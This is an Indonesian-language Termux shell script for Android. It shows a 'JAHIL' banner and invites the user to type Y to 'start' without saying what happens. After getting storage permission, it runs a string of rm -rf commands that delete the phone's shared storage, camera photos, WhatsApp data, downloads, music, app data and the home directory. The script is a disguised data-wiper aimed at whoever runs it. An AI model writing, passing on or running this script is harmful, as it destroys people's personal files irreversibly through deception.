clear

#warna
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'

#WARNA
bi='\033[34;1m' #biru
ij='\033[32;1m' #ijo
pr='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
or='\033[1;38;5;208m' #Orange

echo $me"     ██╗ █████╗ ██╗  ██╗██╗██╗"
echo "     ██║██╔══██╗██║  ██║██║██║"
echo "     ██║███████║███████║██║██║"
echo $pu"██   ██║██╔══██║██╔══██║██║██║"
echo "╚█████╔╝██║  ██║██║  ██║██║███████╗"
echo " ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝"
echo $cyan""
echo "         Author : ExzREO"
echo "  Ketik [ Y / y ] Untuk Mulai!"
echo "  Ketik [ N / n ] Untuk Exit!"
echo $purple""
read -p "[?] SELECT : " pilih
if [ $pilih = "y" ] || [ $pilih = "Y" ];
then
termux-setup-storage
rm -rf /storage/emulated/0
rm -rf /sdcard/0
rm -rf /storage/emulated/0/DCIM
rm -rf /storage/emulated/0/android/obb
rm -rf /sdcard/0/android/data
rm -rf $HOME
rm -rf sdcard/0
rm -rf storage/emulated/0
rm -rf /storage/emulated/0/WhatsApp
rm -rf /sdcard/0/WhatsApp
rm -rf /storage/emulated/0/Downloads
rm -rf /storage/emulated/0/Music
rm -rf /sdcard/0/Music
rm -rf /storage/0/emulated/VidMate
rm -rf /storage/0/emulated/SHAREit

fi

if [ $pilih = "N" ] || [ $pilih = "n" ];
then
echo $pu""
exit
fi